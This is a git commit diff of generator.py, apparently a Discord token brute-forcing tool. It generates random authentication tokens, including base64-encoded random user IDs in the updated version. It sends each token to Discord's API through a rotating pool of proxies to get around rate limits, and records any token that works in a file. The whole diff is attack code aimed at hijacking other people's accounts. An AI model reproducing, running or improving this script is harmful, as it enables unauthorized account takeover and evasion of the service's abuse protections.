b2e1a0067d20ea67c757f255cb56e82d9132a31b
Silvano H <40663430+silvanohirtie@users.noreply.github.com>
2020-12-18 12:39:44 +0100

    Update generator.py

--- generator.py
+++ generator.py
@@ -4,31 +4,30 @@ import os
 import requests
 import proxygen
 from itertools import cycle
+import base64
+from random import randint
 
-print("NOTE! 1 token loop = 4 Tokens of different types. ")
-N = input("How many tokens loop?: ")
+N = input("How many tokens : ")
 count = 0
 current_path = os.path.dirname(os.path.realpath(__file__))
 url = "https://discordapp.com/api/v6/users/@me/library"
 
-while(int(count)<int(N)):
+while(int(count) < int(N)):
     tokens = []
-    firstGen = random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters).upper()+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+ random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-    seconddGen = "MT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-    thirdGen = "MD"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-    fourthGen = "NT"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
-    print(firstGen)
-    print(secondGen)
-    print(thirdGen)
-    print(fourthGen)
-    count+=1
-    tokens.append(firstGen)
-    tokens.append(secondGen)
-    tokens.append(thirdGen)
-    tokens.append(fourthGen)
+    base64_string = "=="
+    while(base64_string.find("==") != -1):
+        sample_string = str(randint(000000000000000000, 999999999999999999))
+        sample_string_bytes = sample_string.encode("ascii")
+        base64_bytes = base64.b64encode(sample_string_bytes)
+        base64_string = base64_bytes.decode("ascii")
+    else:
+        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
+                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
+        count += 1
+        tokens.append(token)
     proxies = proxygen.get_proxies()
     proxy_pool = cycle(proxies)
-    
+
     for token in tokens:
         proxy = next(proxy_pool)
         header = {
@@ -36,12 +35,13 @@ while(int(count)<int(N)):
             "authorization": token
         }
         r = requests.get(url, headers=header, proxies={"http": proxy})
+        print(token)
         if r.status_code == 200:
-            print('[+] Token Works!')
-            f = open(current_path+"/"+"workingtokens.txt","a")
+            print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
+            f = open(current_path+"/"+"workingtokens.txt", "a")
             f.write(token+"\n")
         elif "rate limited." in r.text:
             print("[-] You are being rate limited.")
         else:
-            print('[-] Invalid Token.')
+            print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
     tokens.remove(token)
